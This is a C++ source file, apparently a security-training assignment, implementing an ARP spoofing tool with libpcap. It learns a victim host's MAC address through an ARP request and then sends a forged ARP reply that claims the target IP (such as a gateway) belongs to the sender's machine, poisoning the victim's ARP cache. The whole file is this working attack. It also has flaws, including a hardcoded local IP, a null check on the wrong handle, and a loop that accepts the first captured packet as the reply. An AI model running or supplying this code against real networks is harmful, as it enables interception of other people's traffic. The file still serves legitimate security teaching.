//[BOB 8TH] JAEHYEON SEND_ARP main.cpp CODE
#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <pcap/pcap.h>
#include <arpa/inet.h>
#include "header.h"
#include <unistd.h>

#include <sys/fcntl.h>
#include <sys/errno.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <net/if.h>

void Usage(char *argv){
    printf("Usage : %s [Interface] [Sender IP] [Target IP] \n", argv);
    printf("Example) ./send_arp eth0 192.168.0.11 192.168.0.1 \n");
}

int main(int argc, char* argv[]){
    if(argc != 4){
        Usage(argv[0]);
        return -1;
    }
    char* dev = argv[1]; //argv[1] = Interface
    uint32_t SenIP = inet_addr(argv[2]); //argv[2] = Sender IP
    uint32_t TarIP = inet_addr(argv[3]); //argv[3] = Target IP
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);

    struct etherh etherh;
    struct arph arph;
    struct packet packet;

    //MY_MAC : Helped(http://www.drk.com.ar/code/get-mac-address-in-linux.php)
    struct ifreq ifr;
      int s;
      if ((s = socket(AF_INET, SOCK_STREAM,0)) < 0) {
        perror("socket");
        return -1;
      }
      strcpy(ifr.ifr_name, argv[1]);
      if (ioctl(s, SIOCGIFHWADDR, &ifr) < 0) {
        perror("ioctl");
        return -1;
      }
      u_char *hwaddr = (u_char *)ifr.ifr_hwaddr.sa_data;
    //MY_MAC end

    //GET_Target_MAC
    u_char broadMac[6] = {0xff,0xff,0xff,0xff,0xff,0xff};
    u_char nothingMac[6] = {0x00,0x00,0x00,0x00,0x00,0x00};
    u_int8_t myIP[4] = {172,20,10,4};

    memcpy(&etherh.DMAC, &broadMac[0], 6); //Destination MAC = BroadCast
    memcpy(&etherh.SMAC, &hwaddr[0], 6); //Source MAC = MY
    arph.op = 0x0100; //ARP Request
    memcpy(&arph.SenMAC, &hwaddr[0], 6); //Sender MAC = MY
    memcpy(&arph.SenIP, &myIP[0],4); //Sender IP = MY
    memcpy(&arph.TarMAC, &nothingMac[0], 6); //Target MAC = Nothing
    memcpy(&arph.TarIP, &SenIP, sizeof(SenIP)); //Target IP
    packet.arp = arph;
    packet.eth = etherh;
    int res = pcap_sendpacket(handle,(u_char*)&packet, 42); //send ARP Request Packet
    if(res == -1){
        printf("Send Fail \n");
    }
    struct pcap_pkthdr *header;
    const unsigned char *packet_read;
    int res1;
    while((res1=pcap_next_ex(handle, &header, &packet_read))>=0){
        if(res1==1){
            memcpy(&etherh.DMAC,&packet_read[6],6);
            memcpy(&arph.TarMAC,&packet_read[6],6);
            res1=-1;
            break;
        }else {
            printf("Target MAC Finding.. \n");
        }
    }
    pcap_close(handle);
    //GET_TARGET_MAC end

    //Send_ARP
    if(res1==-1){
        arph.op = 0x0200;
        memcpy(&etherh.SMAC, &hwaddr[0], 6); //Source MAC
        memcpy(&arph.SenMAC, &hwaddr[0], 6); //Sender MAC
        memcpy(&arph.SenIP, &TarIP, sizeof(TarIP)); //Sender IP
        memcpy(&arph.TarIP, &SenIP, sizeof(SenIP)); //Target IP
        packet.arp = arph;
        packet.eth = etherh;
        pcap_t* handle2 = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
        if (handle == nullptr) {
            fprintf(stderr, "couldn't open device %s: %s\n", dev, errbuf);
            return -1;
        }
        int res2 = pcap_sendpacket(handle2,(u_char*)&packet, 42);
        if(res2 == -1){
            printf("Send Fail \n");
        }
        pcap_close(handle2);
    }
}
